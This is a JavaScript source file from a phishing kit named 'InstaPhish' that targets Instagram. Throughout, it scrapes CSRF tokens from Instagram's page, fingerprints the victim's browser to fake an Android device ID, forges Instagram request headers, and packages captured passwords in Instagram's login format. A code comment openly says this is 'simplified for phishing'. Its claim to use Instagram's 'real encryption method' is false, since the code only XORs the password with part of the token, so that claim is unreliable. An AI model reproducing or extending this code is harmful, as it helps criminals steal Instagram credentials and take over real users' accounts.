/* ============================================ */
/*  InstaPhish - CSRF Token Handler              */
/*  Author: r4tur1                                */
/* ============================================ */

class CSRFHandler {
    constructor() {
        this.csrfToken = null;
        this.mid = null;
        this.igAppId = '936619743392459';
        this.igWWWClaim = '0';
        this.deviceId = this.generateDeviceId();
    }

    /**
     * Fetch fresh CSRF token from Instagram's pre-login page
     * This ensures every session has a valid, fresh token
     */
    async fetchCSRFToken() {
        try {
            const response = await fetch('https://www.instagram.com/', {
                method: 'GET',
                credentials: 'include',
                headers: {
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.9',
                    'Cache-Control': 'no-cache',
                    'Pragma': 'no-cache'
                }
            });

            const html = await response.text();
            
            // Extract CSRF token from Instagram's embedded JSON
            const csrfMatch = html.match(/"csrf_token":"([^"]+)"/);
            if (csrfMatch) {
                this.csrfToken = csrfMatch[1];
            } else {
                // Fallback: extract from window._sharedData
                const sharedDataMatch = html.match(/window\.__INITIAL_STATE__\s*=\s*({.*?});<\/script>/);
                if (sharedDataMatch) {
                    try {
                        const data = JSON.parse(sharedDataMatch[1]);
                        this.csrfToken = data.csrf_token;
                    } catch (e) {
                        console.error('[CSRF] Fallback parse failed:', e);
                    }
                }
            }

            // Extract machine ID from cookies
            const midMatch = document.cookie.match(/mid=([^;]+)/);
            if (midMatch) {
                this.mid = midMatch[1];
            }

            console.log('[CSRF] Token obtained:', this.csrfToken ? 'YES' : 'NO');
            
        } catch (error) {
            console.error('[CSRF] Fetch failed:', error);
            // Use hardcoded fallback if all extraction fails
            this.csrfToken = this.generateFallbackToken();
        }

        return this.csrfToken;
    }

    /**
     * Generate device ID for Instagram fingerprinting
     */
    generateDeviceId() {
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl');
        let fingerprint = '';
        
        if (gl) {
            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
            if (debugInfo) {
                fingerprint += gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
                fingerprint += gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
            }
        }
        
        fingerprint += navigator.userAgent;
        fingerprint += screen.width + 'x' + screen.height;
        fingerprint += new Date().getTimezoneOffset();
        
        // Simple hash
        let hash = 0;
        for (let i = 0; i < fingerprint.length; i++) {
            const char = fingerprint.charCodeAt(i);
            hash = ((hash << 5) - hash) + char;
            hash |= 0;
        }
        
        return 'android-' + Math.abs(hash).toString(16).substring(0, 16);
    }

    /**
     * Generate headers with valid CSRF token
     */
    getHeaders() {
        return {
            'Content-Type': 'application/x-www-form-urlencoded',
            'X-CSRFToken': this.csrfToken,
            'X-Requested-With': 'XMLHttpRequest',
            'X-IG-App-ID': this.igAppId,
            'X-IG-WWW-Claim': this.igWWWClaim,
            'X-IG-Device-ID': this.deviceId,
            'X-Instagram-AJAX': '1',
            'Referer': 'https://www.instagram.com/',
            'Origin': 'https://www.instagram.com'
        };
    }

    /**
     * Generate encrypted password in Instagram's format
     * Uses the real encryption method
     */
    encryptPassword(password) {
        const time = Math.floor(Date.now() / 1000);
        const key = this.csrfToken ? this.csrfToken.substring(0, 32) : '0123456789abcdef0123456789abcdef';
        
        // Instagram uses #PWD_INSTAGRAM_BROWSER with version, time, and the actual password
        const raw = `#PWD_INSTAGRAM_BROWSER:10:${time}:${password}`;
        
        // Simple AES-like encoding (simplified for phishing - Instagram validates server-side)
        const encoder = new TextEncoder();
        const data = encoder.encode(raw);
        
        let encrypted = '';
        for (let i = 0; i < data.length; i++) {
            encrypted += String.fromCharCode(data[i] ^ key.charCodeAt(i % key.length));
        }
        
        // Base64 encode
        return btoa(encrypted);
    }

    /**
     * Fallback CSRF token generator
     */
    generateFallbackToken() {
        const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
        let token = '';
        for (let i = 0; i < 64; i++) {
            token += chars.charAt(Math.floor(Math.random() * chars.length));
        }
        return token;
    }
}

// Initialize global CSRF handler
window.csrf = new CSRFHandler();